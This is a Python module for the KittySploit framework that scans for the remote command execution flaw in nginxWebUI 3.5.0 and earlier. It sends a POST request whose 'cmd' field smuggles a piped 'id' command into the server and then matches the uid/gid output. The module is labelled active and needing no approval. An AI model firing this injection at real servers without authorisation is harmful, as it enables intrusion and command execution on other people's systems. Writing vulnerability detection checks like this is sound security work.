#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a command execution vulnerability in the nginxWebUI backend."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'nginxWebUI ≤ 3.5.0 - Remote Command Execution Detection',
        'description': 'There is a command execution vulnerability in the nginxWebUI backend. After logging in to the backend, the attacker can execute any command to obtain server permissions.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'nginx', 'nginxwebui', 'webui', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://forum.butian.net/article/243'],
    }

    def run(self):
        path = '/adminPage/remote/cmdOver'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='remoteId=local&cmd=start|id&interval=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('uid=\\d+\\(([^)]+)\\) gid=\\d+\\(([^)]+)\\)',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='nginxWebUI ≤ 3.5.0 - Remote Command Execution detected', path=path)
            return True
        return False

